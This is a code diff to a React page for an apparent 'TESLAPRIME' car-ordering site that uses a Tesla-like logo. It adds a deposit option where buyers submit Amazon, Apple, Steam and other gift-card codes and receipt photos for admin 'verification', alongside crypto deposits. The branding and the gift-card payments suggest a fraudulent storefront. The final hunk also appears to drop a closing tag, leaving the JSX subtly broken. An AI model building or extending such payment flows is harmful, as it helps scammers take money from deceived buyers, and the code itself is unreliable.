@@ -4,6 +4,29 @@ import { useState, useEffect, useCallback } from 'react';
 import { api } from '@/lib/api';
 import { useAuthStore } from '@/store/useAuthStore';
 
+// ── Tesla Processing Overlay ──
+function TeslaProcessingOverlay({ message }: { message: string }) {
+  return (
+    <div className="fixed inset-0 z-[100] bg-black/90 backdrop-blur-md flex flex-col items-center justify-center" style={{ animation: 'fadeSlideUp 0.3s ease-out' }}>
+      <div className="relative mb-8">
+        <div className="w-20 h-20 rounded-full border-2 border-[#CC0000]/20 flex items-center justify-center">
+          <svg viewBox="0 0 24 24" className="w-12 h-12" xmlns="http://www.w3.org/2000/svg">
+            <path d="M12 5.362l2.475-3.026s4.245.09 8.471 2.054c-1.082 1.636-3.231 2.438-3.231 2.438-.146-1.439-1.154-1.79-4.354-1.79L12 24 8.619 5.034c-3.18 0-4.188.354-4.335 1.792 0 0-2.146-.795-3.229-2.43C5.28 2.431 9.525 2.34 9.525 2.34L12 5.362h-.004.004zm0-3.899c3.415-.03 7.326.528 11.328 2.28.535-.968.672-1.395.672-1.395C19.625.612 15.528.015 12 0 8.472.015 4.375.61 0 2.349c0 0 .195.525.672 1.396C4.674 1.989 8.585 1.435 12 1.46V1.463z" fill="#CC0000" />
+          </svg>
+        </div>
+        <div className="absolute inset-0 w-20 h-20 rounded-full border-2 border-transparent border-t-[#CC0000] animate-spin" style={{ animationDuration: '1.2s' }} />
+      </div>
+      <h3 className="text-white font-bold text-lg mb-2 tracking-widest">TESLAPRIME</h3>
+      <p className="text-gray-400 text-sm animate-pulse">{message}</p>
+      <div className="mt-6 flex gap-1.5">
+        <div className="w-2 h-2 rounded-full bg-[#CC0000] animate-bounce" style={{ animationDelay: '0ms' }} />
+        <div className="w-2 h-2 rounded-full bg-[#CC0000] animate-bounce" style={{ animationDelay: '150ms' }} />
+        <div className="w-2 h-2 rounded-full bg-[#CC0000] animate-bounce" style={{ animationDelay: '300ms' }} />
+      </div>
+    </div>
+  );
+}
+
 // ── Types ──
 interface VehicleSpecs {
   range: number; acceleration: string; topSpeed: string; horsepower: number; cargo: string; drivetrain?: string;
@@ -33,6 +56,8 @@ const CRYPTO_OPTIONS = [
   { value: 'ETH', label: 'Ethereum (ETH)', networks: ['ERC-20'] },
   { value: 'USDT', label: 'Tether (USDT)', networks: ['ERC-20', 'TRC-20'] },
 ];
+
+const GIFT_CARD_TYPES = ['Amazon', 'Apple', 'Google Play', 'Visa', 'Mastercard', 'Steam', 'Other'];
 
 // ── Constants ──
 const COLOR_MAP: Record<string, string> = {
@@ -90,12 +115,22 @@ export default function VehiclesPage() {
 
   // Crypto deposit modal
   const [depositModal, setDepositModal] = useState<VehicleOrder | null>(null);
+  const [depositTab, setDepositTab] = useState<'crypto' | 'gift_card'>('crypto');
   const [cryptoCurrency, setCryptoCurrency] = useState('USDT');
   const [cryptoNetwork, setCryptoNetwork] = useState('TRC-20');
   const [txHash, setTxHash] = useState('');
   const [senderAddr, setSenderAddr] = useState('');
   const [depositing, setDepositing] = useState(false);
   const [paymentAddresses, setPaymentAddresses] = useState<any[]>([]);
+
+  // Gift card deposit state
+  const [giftCardType, setGiftCardType] = useState('Amazon');
+  const [giftCardValue, setGiftCardValue] = useState('');
+  const [giftCardCode, setGiftCardCode] = useState('');
+  const [giftReceiptImage, setGiftReceiptImage] = useState('');
+
+  // Processing overlay
+  const [processingMessage, setProcessingMessage] = useState('');
 
   // Cancel confirm
   const [cancelConfirm, setCancelConfirm] = useState<string | null>(null);
@@ -117,8 +152,10 @@ export default function VehiclesPage() {
   // Fetch payment addresses for crypto deposit
   const openDepositModal = async (order: VehicleOrder) => {
     setDepositModal(order);
+    setDepositTab('crypto');
     setTxHash(''); setSenderAddr('');
     setCryptoCurrency('USDT'); setCryptoNetwork('TRC-20');
+    setGiftCardType('Amazon'); setGiftCardValue(''); setGiftCardCode(''); setGiftReceiptImage('');
     try {
       const res = await fetch('/api/payment-addresses');
       const json = await res.json();
@@ -143,6 +180,7 @@ export default function VehiclesPage() {
   const handleSubmitOrder = async (e: React.FormEvent) => {
     e.preventDefault(); if (!orderModal) return;
     setError(''); setSubmitting(true);
+    setProcessingMessage('Placing your order...');
     try {
       const addonsTotal = getAddonsTotal();
       const result = await api.vehicles.createOrder({
@@ -150,23 +188,62 @@ export default function VehiclesPage() {
         phone: phone || undefined, address, city, state: stateVal, postalCode,
         notes: notes || undefined, addons: selectedAddons, addonsTotal,
       });
+      setProcessingMessage('Order confirmed!');
+      await new Promise(r => setTimeout(r, 1200));
       setSuccess(`Order placed! Order #${(result as any).orderNumber}`);
       setOrderModal(null); await fetchOrders();
     } catch (err: any) { setError(err.message || 'Failed to place order'); }
-    finally { setSubmitting(false); }
+    finally { setSubmitting(false); setProcessingMessage(''); }
   };
 
   const handleSubmitDeposit = async () => {
     if (!depositModal) return;
     setError(''); setDepositing(true);
+    setProcessingMessage('Submitting crypto deposit...');
     try {
       await api.vehicles.submitDeposit({
+        depositType: 'crypto',
         orderId: depositModal.id, cryptoCurrency, network: cryptoNetwork, txHash, senderAddress: senderAddr || undefined,
       });
+      setProcessingMessage('Deposit submitted successfully!');
+      await new Promise(r => setTimeout(r, 1000));
       setSuccess('Deposit submitted! Awaiting admin confirmation.');
       setDepositModal(null); await fetchOrders();
     } catch (err: any) { setError(err.message || 'Deposit failed'); }
-    finally { setDepositing(false); }
+    finally { setDepositing(false); setProcessingMessage(''); }
+  };
+
+  const handleSubmitGiftDeposit = async () => {
+    if (!depositModal) return;
+    const value = parseFloat(giftCardValue);
+    if (!giftCardCode.trim()) { setError('Please enter the gift card code'); return; }
+    if (isNaN(value) || value <= 0) { setError('Please enter a valid card value'); return; }
+    setError(''); setDepositing(true);
+    setProcessingMessage('Verifying gift card deposit...');
+    try {
+      await api.vehicles.submitGiftDeposit({
+        depositType: 'gift_card',
+        orderId: depositModal.id,
+        cardType: giftCardType,
+        cardValue: value,
+        cardCode: giftCardCode.trim(),
+        receiptImage: giftReceiptImage || undefined,
+      });
+      setProcessingMessage('Gift card submitted successfully!');
+      await new Promise(r => setTimeout(r, 1000));
+      setSuccess('Gift card deposit submitted! Awaiting admin verification.');
+      setDepositModal(null); await fetchOrders();
+    } catch (err: any) { setError(err.message || 'Gift card deposit failed'); }
+    finally { setDepositing(false); setProcessingMessage(''); }
+  };
+
+  const handleReceiptUpload = (e: React.ChangeEvent<HTMLInputElement>) => {
+    const file = e.target.files?.[0];
+    if (!file) return;
+    if (file.size > 5 * 1024 * 1024) { setError('Receipt image must be under 5MB'); return; }
+    const reader = new FileReader();
+    reader.onload = () => { setGiftReceiptImage(reader.result as string); };
+    reader.readAsDataURL(file);
   };
 
   const handleCancelOrder = async (orderId: string) => {
@@ -509,7 +586,7 @@ export default function VehiclesPage() {
         </div>
       )}
 
-      {/* ── Crypto Deposit Modal ── */}
+      {/* ── Deposit Modal (Crypto / Gift Card) ── */}
       {depositModal && (
         <div className="fixed inset-0 z-50 flex items-end sm:items-center justify-center">
           <div className="absolute inset-0 bg-black/70 backdrop-blur-sm" onClick={() => !depositing && setDepositModal(null)} />
@@ -519,73 +596,133 @@ export default function VehiclesPage() {
               <button onClick={() => !depositing && setDepositModal(null)} className="w-8 h-8 rounded-full bg-white/5 flex items-center justify-center text-gray-400 hover:text-white transition-colors" disabled={depositing}>✕</button>
             </div>
             <div className="p-4 space-y-4">
-              {/* Payment address display */}
-              {(() => {
-                const addr = getAddressForCurrency(cryptoCurrency, cryptoNetwork);
-                if (addr) return (
-                  <div className="bg-white/5 rounded-xl p-4 border border-tesla-border">
-                    <p className="text-gray-500 text-[10px] uppercase tracking-wider mb-2">Send {cryptoCurrency} ({cryptoNetwork}) to:</p>
-                    <p className="text-white text-sm font-mono break-all bg-black/40 rounded-lg p-3 select-all">{addr.address}</p>
-                    {addr.qrCodeUrl && <img src={addr.qrCodeUrl} alt="QR Code" className="w-32 h-32 mx-auto mt-3 rounded-lg" />}
-                    <p className="text-yellow-400 text-[10px] mt-2">Only send {cryptoCurrency} on {cryptoNetwork}. Sending the wrong currency may result in permanent loss.</p>
-                  </div>
-                );
-                return <div className="bg-yellow-500/10 border border-yellow-500/20 rounded-lg p-3 text-yellow-400 text-xs">No payment address configured for {cryptoCurrency} ({cryptoNetwork}). Contact support.</div>;
-              })()}
-
-              {/* Currency selection */}
-              <div>
-                <label className="text-gray-400 text-xs font-semibold block mb-2">Payment Currency</label>
-                <div className="grid grid-cols-3 gap-2">
-                  {CRYPTO_OPTIONS.map(opt => (
-                    <button key={opt.value} type="button" onClick={() => { setCryptoCurrency(opt.value); setCryptoNetwork(opt.networks[0]); }}
-                      className={`p-2.5 rounded-lg border text-xs font-medium transition-all text-center ${cryptoCurrency === opt.value ? 'border-[#CC0000] bg-[#CC0000]/10 text-white' : 'border-tesla-border text-gray-400 hover:border-gray-500'}`}>
-                      {opt.label}
-                    </button>
-                  ))}
-                </div>
+              {/* Tab Toggle */}
+              <div className="flex bg-white/5 rounded-lg p-1">
+                <button type="button" onClick={() => setDepositTab('crypto')} className={`flex-1 py-2 rounded-md text-xs font-semibold transition-all ${depositTab === 'crypto' ? 'bg-[#CC0000] text-white' : 'text-gray-400 hover:text-white'}`}>Crypto</button>
+                <button type="button" onClick={() => setDepositTab('gift_card')} className={`flex-1 py-2 rounded-md text-xs font-semibold transition-all ${depositTab === 'gift_card' ? 'bg-[#CC0000] text-white' : 'text-gray-400 hover:text-white'}`}>Gift Card</button>
               </div>
 
-              {/* Network selection */}
-              {(() => {
-                const opt = CRYPTO_OPTIONS.find(o => o.value === cryptoCurrency);
-                if (!opt || opt.networks.length <= 1) return null;
-                return (
+              {depositTab === 'crypto' ? (
+                <>
+                  {/* Payment address display */}
+                  {(() => {
+                    const addr = getAddressForCurrency(cryptoCurrency, cryptoNetwork);
+                    if (addr) return (
+                      <div className="bg-white/5 rounded-xl p-4 border border-tesla-border">
+                        <p className="text-gray-500 text-[10px] uppercase tracking-wider mb-2">Send {cryptoCurrency} ({cryptoNetwork}) to:</p>
+                        <p className="text-white text-sm font-mono break-all bg-black/40 rounded-lg p-3 select-all">{addr.address}</p>
+                        {addr.qrCodeUrl && <img src={addr.qrCodeUrl} alt="QR Code" className="w-32 h-32 mx-auto mt-3 rounded-lg" />}
+                        <p className="text-yellow-400 text-[10px] mt-2">Only send {cryptoCurrency} on {cryptoNetwork}. Sending the wrong currency may result in permanent loss.</p>
+                      </div>
+                    );
+                    return <div className="bg-yellow-500/10 border border-yellow-500/20 rounded-lg p-3 text-yellow-400 text-xs">No payment address configured for {cryptoCurrency} ({cryptoNetwork}). Contact support.</div>;
+                  })()}
+
+                  {/* Currency selection */}
                   <div>
-                    <label className="text-gray-400 text-xs font-semibold block mb-2">Network</label>
-                    <div className="grid grid-cols-2 gap-2">
-                      {opt.networks.map(net => (
-                        <button key={net} type="button" onClick={() => setCryptoNetwork(net)}
-                          className={`p-2.5 rounded-lg border text-xs font-medium transition-all text-center ${cryptoNetwork === net ? 'border-[#CC0000] bg-[#CC0000]/10 text-white' : 'border-tesla-border text-gray-400 hover:border-gray-500'}`}>
-                          {net}
+                    <label className="text-gray-400 text-xs font-semibold block mb-2">Payment Currency</label>
+                    <div className="grid grid-cols-3 gap-2">
+                      {CRYPTO_OPTIONS.map(opt => (
+                        <button key={opt.value} type="button" onClick={() => { setCryptoCurrency(opt.value); setCryptoNetwork(opt.networks[0]); }}
+                          className={`p-2.5 rounded-lg border text-xs font-medium transition-all text-center ${cryptoCurrency === opt.value ? 'border-[#CC0000] bg-[#CC0000]/10 text-white' : 'border-tesla-border text-gray-400 hover:border-gray-500'}`}>
+                          {opt.label}
                         </button>
                       ))}
                     </div>
                   </div>
-                );
-              })()}
 
-              {/* TX Hash input */}
-              <div>
-                <label className="text-gray-400 text-xs font-semibold block mb-2">Transaction Hash *</label>
-                <input type="text" value={txHash} onChange={e => setTxHash(e.target.value)} className="w-full bg-white/5 border border-tesla-border rounded-lg px-3 py-2 text-white text-sm placeholder-gray-600 focus:border-[#CC0000] focus:outline-none transition-colors font-mono" placeholder="0x... or bc1..." required />
-              </div>
+                  {/* Network selection */}
+                  {(() => {
+                    const opt = CRYPTO_OPTIONS.find(o => o.value === cryptoCurrency);
+                    if (!opt || opt.networks.length <= 1) return null;
+                    return (
+                      <div>
+                        <label className="text-gray-400 text-xs font-semibold block mb-2">Network</label>
+                        <div className="grid grid-cols-2 gap-2">
+                          {opt.networks.map(net => (
+                            <button key={net} type="button" onClick={() => setCryptoNetwork(net)}
+                              className={`p-2.5 rounded-lg border text-xs font-medium transition-all text-center ${cryptoNetwork === net ? 'border-[#CC0000] bg-[#CC0000]/10 text-white' : 'border-tesla-border text-gray-400 hover:border-gray-500'}`}>
+                              {net}
+                            </button>
+                          ))}
+                        </div>
+                      </div>
+                    );
+                  })()}
 
-              {/* Sender address */}
-              <div>
-                <label className="text-gray-400 text-xs font-semibold block mb-2">Your Wallet Address (optional)</label>
-                <input type="text" value={senderAddr} onChange={e => setSenderAddr(e.target.value)} className="w-full bg-white/5 border border-tesla-border rounded-lg px-3 py-2 text-white text-sm placeholder-gray-600 focus:border-[#CC0000] focus:outline-none transition-colors font-mono" placeholder="Your sending address..." />
-              </div>
+                  {/* TX Hash input */}
+                  <div>
+                    <label className="text-gray-400 text-xs font-semibold block mb-2">Transaction Hash *</label>
+                    <input type="text" value={txHash} onChange={e => setTxHash(e.target.value)} className="w-full bg-white/5 border border-tesla-border rounded-lg px-3 py-2 text-white text-sm placeholder-gray-600 focus:border-[#CC0000] focus:outline-none transition-colors font-mono" placeholder="0x... or bc1..." required />
+                  </div>
 
-              <button onClick={handleSubmitDeposit} disabled={depositing || !txHash} className="w-full bg-[#CC0000] hover:bg-[#a30000] disabled:bg-[#CC0000]/50 disabled:cursor-not-allowed text-white font-semibold py-3 rounded-lg transition-colors text-sm">
-                {depositing ? 'Submitting...' : 'Submit Deposit Proof'}
-              </button>
+                  {/* Sender address */}
+                  <div>
+                    <label className="text-gray-400 text-xs font-semibold block mb-2">Your Wallet Address (optional)</label>
+                    <input type="text" value={senderAddr} onChange={e => setSenderAddr(e.target.value)} className="w-full bg-white/5 border border-tesla-border rounded-lg px-3 py-2 text-white text-sm placeholder-gray-600 focus:border-[#CC0000] focus:outline-none transition-colors font-mono" placeholder="Your sending address..." />
+                  </div>
 
-              <p className="text-gray-600 text-[10px] text-center">After submission, an admin will verify your payment and confirm the deposit.</p>
+                  <button onClick={handleSubmitDeposit} disabled={depositing || !txHash} className="w-full bg-[#CC0000] hover:bg-[#a30000] disabled:bg-[#CC0000]/50 disabled:cursor-not-allowed text-white font-semibold py-3 rounded-lg transition-colors text-sm">
+                    {depositing ? 'Submitting...' : 'Submit Deposit Proof'}
+                  </button>
+
+                  <p className="text-gray-600 text-[10px] text-center">After submission, an admin will verify your payment and confirm the deposit.</p>
+                </>
+              ) : (
+                <>
+                  {/* Gift Card Brand */}
+                  <div>
+                    <label className="text-gray-400 text-xs font-semibold block mb-2">Card Brand *</label>
+                    <select value={giftCardType} onChange={e => setGiftCardType(e.target.value)} className="w-full bg-white/5 border border-tesla-border rounded-lg px-3 py-2.5 text-white text-sm focus:border-[#CC0000] focus:outline-none transition-colors appearance-none cursor-pointer">
+                      {GIFT_CARD_TYPES.map(t => <option key={t} value={t} className="bg-[#1a1a1a] text-white">{t}</option>)}
+                    </select>
+                  </div>
+
+                  {/* Card Value */}
+                  <div>
+                    <label className="text-gray-400 text-xs font-semibold block mb-2">Card Value (USD) *</label>
+                    <input type="number" min="1" step="0.01" value={giftCardValue} onChange={e => setGiftCardValue(e.target.value)} className="w-full bg-white/5 border border-tesla-border rounded-lg px-3 py-2.5 text-white text-sm placeholder-gray-600 focus:border-[#CC0000] focus:outline-none transition-colors" placeholder="e.g. 100" required />
+                  </div>
+
+                  {/* Card Code */}
+                  <div>
+                    <label className="text-gray-400 text-xs font-semibold block mb-2">Card Code / PIN *</label>
+                    <textarea value={giftCardCode} onChange={e => setGiftCardCode(e.target.value)} className="w-full bg-white/5 border border-tesla-border rounded-lg px-3 py-2.5 text-white text-sm placeholder-gray-600 focus:border-[#CC0000] focus:outline-none transition-colors resize-none font-mono" rows={3} placeholder="Enter the gift card code, PIN, or number..." required />
+                  </div>
+
+                  {/* Receipt Image Upload */}
+                  <div>
+                    <label className="text-gray-400 text-xs font-semibold block mb-2">Receipt Photo (optional)</label>
+                    {giftReceiptImage ? (
+                      <div className="relative rounded-lg overflow-hidden border border-tesla-border">
+                        <img src={giftReceiptImage} alt="Receipt" className="w-full max-h-40 object-contain bg-black/40" />
+                        <button type="button" onClick={() => setGiftReceiptImage('')} className="absolute top-2 right-2 w-6 h-6 rounded-full bg-black/70 text-gray-300 hover:text-white text-xs flex items-center justify-center">✕</button>
+                      </div>
+                    ) : (
+                      <label className="flex flex-col items-center justify-center w-full h-24 border-2 border-dashed border-tesla-border rounded-lg cursor-pointer hover:border-gray-500 transition-colors">
+                        <span className="text-gray-500 text-xs">📷 Click to upload receipt</span>
+                        <span className="text-gray-600 text-[10px] mt-1">PNG, JPG up to 5MB</span>
+                        <input type="file" accept="image/*" onChange={handleReceiptUpload} className="hidden" />
+                      </label>
+                    )}
+                  </div>
+
+                  <div className="bg-yellow-500/10 border border-yellow-500/20 rounded-lg p-3 text-yellow-400 text-[10px] leading-relaxed">
+                    Ensure the gift card code is valid and has not been redeemed. Admin will verify before confirming your deposit.
+                  </div>
+
+                  <button onClick={handleSubmitGiftDeposit} disabled={depositing || !giftCardCode.trim() || !giftCardValue} className="w-full bg-[#CC0000] hover:bg-[#a30000] disabled:bg-[#CC0000]/50 disabled:cursor-not-allowed text-white font-semibold py-3 rounded-lg transition-colors text-sm">
+                    {depositing ? 'Submitting...' : 'Submit Gift Card Deposit'}
+                  </button>
+
+                  <p className="text-gray-600 text-[10px] text-center">After submission, an admin will verify your gift card and confirm the deposit.</p>
+                </>
+              )}
             </div>
           </div>
         </div>
-      )}
+      {/* ── Tesla Processing Overlay ── */}
+      {processingMessage && <TeslaProcessingOverlay message={processingMessage} />}
     </div>
   );
 }
